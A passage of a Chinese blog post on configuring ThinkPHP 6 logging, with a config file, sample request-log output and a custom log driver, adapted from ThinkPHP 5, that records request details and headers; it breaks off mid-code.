class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 日志设置</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">handle</span>\<span class="title">Tp6Log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 默认日志记录通道</span></span><br><span class="line">    <span class="string">'default'</span>      =&gt; env(<span class="string">'log.channel'</span>, <span class="string">'file'</span>),</span><br><span class="line">    <span class="comment">// 日志记录级别</span></span><br><span class="line">    <span class="string">'level'</span>        =&gt; [],</span><br><span class="line">    <span class="comment">// 日志类型记录的通道 ['error'=&gt;'email',...]</span></span><br><span class="line">    <span class="string">'type_channel'</span> =&gt; [],</span><br><span class="line">    <span class="comment">// 关闭全局日志写入</span></span><br><span class="line">    <span class="string">'close'</span>        =&gt; <span class="keyword">false</span>,</span><br><span class="line">    <span class="comment">// 全局日志处理 支持闭包</span></span><br><span class="line">    <span class="string">'processor'</span>    =&gt; <span class="keyword">null</span>,</span><br><span class="line">    <span class="comment">// ThinkPHP对系统的日志按照级别来分类记录，按照PSR-3日志规范，日志的级别从低到高依次为：</span></span><br><span class="line">    <span class="comment">// debug, info, notice, warning, error, critical, alert, emergency</span></span><br><span class="line">    <span class="comment">// ThinkPHP额外增加了一个sql日志级别仅用于记录SQL日志（并且仅当开启数据库调试模式有效）。</span></span><br><span class="line">    <span class="comment">// 日志通道列表</span></span><br><span class="line">    <span class="string">'channels'</span>     =&gt; [</span><br><span class="line">        <span class="string">'file'</span> =&gt; [</span><br><span class="line">            <span class="comment">// 日志记录方式</span></span><br><span class="line">            <span class="string">'type'</span>           =&gt; <span class="string">'File'</span>,</span><br><span class="line">            <span class="comment">// 'type'           =&gt; Tp6Log::class,</span></span><br><span class="line">            <span class="comment">// 日志保存目录</span></span><br><span class="line">            <span class="comment">// "path"           =&gt; "",</span></span><br><span class="line">            <span class="comment">// 如果没有设置路径，日志会输出到对应的应用目录下; 如果设置了路径，则所有的日志都会输出到该路径下</span></span><br><span class="line">            <span class="string">'path'</span>           =&gt; app()-&gt;getRuntimePath() . <span class="string">'debug'</span>,</span><br><span class="line">            <span class="comment">// 单文件日志写入</span></span><br><span class="line">            <span class="string">'single'</span>         =&gt; <span class="keyword">false</span>,</span><br><span class="line">            <span class="comment">// 独立日志级别</span></span><br><span class="line">            <span class="string">'apart_level'</span>    =&gt; [<span class="string">'error'</span>, <span class="string">'sql'</span>,],</span><br><span class="line">            <span class="comment">// 最大日志文件数量</span></span><br><span class="line">            <span class="string">'max_files'</span>      =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="comment">// 使用JSON格式记录</span></span><br><span class="line">            <span class="string">'json'</span>           =&gt; <span class="keyword">false</span>,</span><br><span class="line">            <span class="comment">// 文件大小</span></span><br><span class="line">            <span class="string">'file_size'</span>   =&gt; <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">2</span>,</span><br><span class="line">            <span class="comment">// 日志处理</span></span><br><span class="line">            <span class="string">'processor'</span>      =&gt; <span class="keyword">null</span>,</span><br><span class="line">            <span class="comment">// 关闭通道日志写入</span></span><br><span class="line">            <span class="string">'close'</span>          =&gt; <span class="keyword">false</span>,</span><br><span class="line">            <span class="comment">// 日志输出格式化</span></span><br><span class="line">            <span class="string">'format'</span>         =&gt; <span class="string">'[%s][%s] %s'</span>,</span><br><span class="line">            <span class="comment">// 是否实时写入</span></span><br><span class="line">            <span class="string">'realtime_write'</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// 其它日志通道配置</span></span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="自定义日志驱动"><a href="#自定义日志驱动" class="headerlink" title="自定义日志驱动"></a>自定义日志驱动</h2><p>我希望哪些信息能被记录？</p><ul><li>请求记录</li><li>SQL 执行记录</li><li>错误信息</li></ul><p><code>ThinkPHP 5.x 版本</code>，还存在请求记录的日志。类似下面的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[2022-06-16T11:38:42+08:00] 127.0.0.1 POST localhost&#x2F;api&#x2F;v1.index&#x2F;index</span><br><span class="line">[运行时间：0.508767s] [吞吐率：1.97req&#x2F;s] [内存消耗：705.89kb] [文件加载：156]</span><br><span class="line">[ HEADER ] array (</span><br><span class="line">  &#39;accept-encoding&#39; &#x3D;&gt; &#39;gzip, deflate&#39;,</span><br><span class="line">  &#39;referer&#39; &#x3D;&gt; &#39;https:&#x2F;&#x2F;servicewechat.com&#x2F;wx8703b750b3e3c6dc&#x2F;devtools&#x2F;page-frame.html&#39;,</span><br><span class="line">  &#39;accept&#39; &#x3D;&gt; &#39;*&#x2F;*&#39;,</span><br><span class="line">  &#39;version&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">  &#39;token&#39; &#x3D;&gt; &#39;ae42R9eUhyp3NUdW+AzKYOvEcr&#x2F;UCwYLGA6nNMxrhT5AApsjJCpQuCX5WA2jePdKZBV1RP1Ws0&#x2F;cK0KXxAjNDu&#x2F;JRW4tqYPJ2vyNiiCwT6WbLe0Y2t7fo2P4sfRZrRSEnePSlJAetbU0afh5mzi9X6NztTd7fk4cBtGFxhFmTMmWynoL+HZ0DBGQ2VjwT82DjYbaUq+Ww4JUybQeSvpxcwqbEY3UR0L++gz+tQ&#39;,</span><br><span class="line">  &#39;user-agent&#39; &#x3D;&gt; &#39;Mozilla&#x2F;5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit&#x2F;604.1.38 (KHTML, like Gecko) Version&#x2F;11.0 Mobile&#x2F;15A372 Safari&#x2F;604.1 wechatdevtools&#x2F;1.05.2107090 MicroMessenger&#x2F;8.0.5 Language&#x2F;zh_CN webview&#x2F;&#39;,</span><br><span class="line">  &#39;content-type&#39; &#x3D;&gt; &#39;application&#x2F;json&#39;,</span><br><span class="line">  &#39;scene&#39; &#x3D;&gt; &#39;weixin&#39;,</span><br><span class="line">  &#39;content-length&#39; &#x3D;&gt; &#39;46&#39;,</span><br><span class="line">  &#39;connection&#39; &#x3D;&gt; &#39;keep-alive&#39;,</span><br><span class="line">  &#39;host&#39; &#x3D;&gt; &#39;apiv2.smshw.local&#39;,</span><br><span class="line">)</span><br><span class="line">[ PARAM ] array (</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ThinkPHP 6.0 则是直接砍掉了记录请求信息。</p><p>这里直接拿<code>ThinkPHP5.x</code> 的日志类源码进行修改，在 <code>ThinkPHP6.x</code> 中作为日志驱动：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span> (strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">handle</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">DateTime</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DateTimeZone</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">App</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">LogHandlerInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 本地化调试输出到文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tp6Log</span> <span class="keyword">implements</span> <span class="title">LogHandlerInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="string">'time_format'</span> =&gt; <span class="string">'c'</span>,</span><br><span class="line">        <span class="string">'single'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">        <span class="string">'file_size'</span> =&gt; <span class="number">2097152</span>,</span><br><span class="line">        <span class="string">'path'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'apart_level'</span> =&gt; [],</span><br><span class="line">        <span class="string">'max_files'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'json'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">        <span class="string">'json_options'</span> =&gt; JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES,</span><br><span class="line">        <span class="string">'format'</span> =&gt; <span class="string">'[%s][%s] %s'</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $app;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化并传入参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(App $app, $config = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array($config)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = array_merge(<span class="keyword">$this</span>-&gt;config, $config);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;config[<span class="string">'format'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config[<span class="string">'format'</span>] = <span class="string">'[%s][%s] %s'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>] = $app-&gt;getRuntimePath() . <span class="string">'log'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>], <span class="number">-1</span>) != DIRECTORY_SEPARATOR) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>] .= DIRECTORY_SEPARATOR;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 日志写入接口</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $log 日志信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $log)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $destination = <span class="keyword">$this</span>-&gt;getMasterLogFile();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $path = dirname($destination);</span><br><span class="line">        !is_dir($path) &amp;&amp; mkdir($path, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        $info = [];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 日志信息封装</span></span><br><span class="line">        $time = DateTime::createFromFormat(<span class="string">'0.u00 U'</span>, microtime())-&gt;setTimezone(<span class="keyword">new</span> DateTimeZone(date_default_timezone_get()))-&gt;format(<span class="keyword">$this</span>-&gt;config[<span class="string">'time_format'</span>]);</span><br><span class="line"></span><br><span class="line">        $request = Request::instance();</span><br><span class="line">        <span class="comment">//新增</span></span><br><span class="line">        $requestInfo = [</span><br><span class="line">            <span class="string">'ip'</span> =&gt; $request-&gt;ip(),</span><br><span class="line">            <span class="string">'method'</span> =&gt; $request-&gt;method(),</span><br><span class="line">            <span class="string">'host'</span> =&gt; $request-&gt;host(),</span><br><span class="line">            <span class="string">'uri'</span> =&gt; $request-&gt;url()</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($log[<span class="string">'sql'</span>][<span class="number">0</span>]) &amp;&amp; strpos(<span class="string">'CONNECT'</span>,$log[<span class="string">'sql'</span>][<span class="number">0</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;config[<span class="string">'json'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            $debugInfo = [</span><br><span class="line">                <span class="string">'param'</span> =&gt; <span class="string">'[ PARAM ] '</span> . var_export($request-&gt;param(), <span class="keyword">true</span>),</span><br><span class="line">                <span class="string">'header'</span> =&gt; <span class="string">'[ HEADER ] '</span> . var_export($request-&gt;header(), <span class="keyword">true</span>)</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">foreach</span> ($debugInfo <span class="keyword">as</span> $row) &#123;</span><br><span class="line">                array_unshift($info, $row);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 增加额外的调试信息</span></span><br><span class="line">            $runtime = round(microtime(<span class="keyword">true</span>) - <span class="keyword">$this</span>-&gt;app-&gt;getBeginTime(), <span class="number">10</span>);</span><br><span class="line">            $reqs = $runtime &gt; <span class="number">0</span> ? number_format(<span class="number">1</span> / $runtime, <span class="number">2</span>) : <span class="string">'∞'</span>;</span><br><span class="line">            $memory_use = number_format((memory_get_usage() - <span class="keyword">$this</span>-&gt;app-&gt;getBeginMem()) / <span class="number">1024</span>, <span class="number">2</span>);</span><br><span class="line">            $time_str = <span class="string">'[运行时间：'</span> . number_format($runtime, <span class="number">6</span>) . <span class="string">'s] [吞吐率：'</span> . $reqs . <span class="string">'req/s]'</span>;</span><br><span class="line">            $memory_str = <span class="string">' [内存消耗：'</span> . $memory_use . <span class="string">'kb]'</span>;</span><br><span class="line">            $file_load = <span class="string">' [文件加载：'</span> . count(get_included_files()) . <span class="string">']'</span>;</span><br><span class="line">            array_unshift($info, $time_str . $memory_str . $file_load);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            array_unshift($info, <span class="string">"---------------------------------------------------------------\r\n[&#123;$time&#125;] &#123;$requestInfo['ip']&#125; &#123;$requestInfo['method']&#125; &#123;$requestInfo['host']&#125;&#123;$requestInfo['uri']&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($log <span class="keyword">as</span> $type =&gt; $val) &#123;</span><br><span class="line">            $message = [];</span><br><span class="line">            <span class="keyword">foreach</span> ($val <span class="keyword">as</span> $msg) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!is_string($msg)) &#123;</span><br><span class="line">                    $msg = var_export($msg, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $message[] = <span class="keyword">$this</span>-&gt;config[<span class="string">'json'</span>] ?</span><br><span class="line">                    json_encode([<span class="string">'time'</span> =&gt; $time, <span class="string">'type'</span> =&gt; $type, <span class="string">'msg'</span> =&gt; $msg], <span class="keyword">$this</span>-&gt;config[<span class="string">'json_options'</span>]) :</span><br><span class="line">                    sprintf(<span class="keyword">$this</span>-&gt;config[<span class="string">'format'</span>], $time, $type, $msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">true</span> === <span class="keyword">$this</span>-&gt;config[<span class="string">'apart_level'</span>] || in_array($type, <span class="keyword">$this</span>-&gt;config[<span class="string">'apart_level'</span>])) &#123;</span><br><span class="line">                <span class="comment">//这一句很关键，可以给mysql或者其他独立的日志，也加上请求和时间等信息</span></span><br><span class="line">                array_unshift($message, <span class="string">"---------------------------------------------------------------\r\n[&#123;$time&#125;] &#123;$requestInfo['ip']&#125; &#123;$requestInfo['method']&#125; &#123;$requestInfo['host']&#125;&#123;$requestInfo['uri']&#125;"</span>);</span><br><span class="line">                <span class="comment">// 独立记录的日志级别</span></span><br><span class="line">                $filename = <span class="keyword">$this</span>-&gt;getApartLevelFile($path, $type);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;write($message, $filename);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $info[$type] = $message;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;write($info, $destination);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取主日志文件名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getMasterLogFile</span><span class="params">()</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'max_files'</span>]) &#123;</span><br><span class="line">            $files = glob(<span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>] . <span class="string">'*.log'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (count($files) &gt; <span class="keyword">$this</span>-&gt;config[<span class="string">'max_files'</span>]) &#123;</span><br><span class="line">                    unlink($files[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'single'</span>]) &#123;</span><br><span class="line">            $name = is_string(<span class="keyword">$this</span>-&gt;config[<span class="string">'single'</span>]) ? <span class="keyword">$this</span>-&gt;config[<span class="string">'single'</span>] : <span class="string">'single'</span>;</span><br><span class="line">            $destination = <span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>] . $name . <span class="string">'.log'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'max_files'</span>]) &#123;</span><br><span class="line">                $filename = date(<span class="string">'Ymd'</span>) . <span class="string">'.log'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $filename = date(<span class="string">'Ym'</span>) . DIRECTORY_SEPARATOR . date(<span class="string">'d'</span>) . <span class="string">'.log'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $destination = <span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>] . $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $destination;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取独立日志文件名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path 日志目录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $type 日志类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getApartLevelFile</span><span class="params">(string $path, string $type)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'single'</span>]) &#123;</span><br><span class="line">            $name = is_string(<span class="keyword">$this</span>-&gt;config[<span class="string">'single'</span>]) ? <span class="keyword">$this</span>-&gt;config[<span class="string">'single'</span>] : <span class="string">'single'</span>;</span><br><span class="line"></span><br><span class="line">            $name .= <span class="string">'_'</span> . $type;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'max_files'</span>]) &#123;</span><br><span class="line">            $name = date(<span class="string">'Ymd'</span>) . <span class="string">'_'</span> . $type;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $name = date(<span class="string">'d'</span>) . <span class="string">'_'</span> . $type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $path . DIRECTORY_SEPARATOR . $name . <span class="string">'.log'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 日志写入</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $message 日志信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $destination 日志文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(array $message, string $destination)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检测日志文件大小，超过配置大小则备份日志文件重新生成</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkLogSize($destination);</span><br><span class="line"></span><br><span class="line">        $info = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($message <span class="keyword">as</span> $type =&gt; $msg) &#123;</span><br><span class="line">            $info[$type] = is_array($msg) ? implode(PHP_EOL, $msg) : $msg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $message = implode(PHP_EOL, $info) . PHP_EOL;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> error_log($message, <span class="number">3</span>, $destination);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 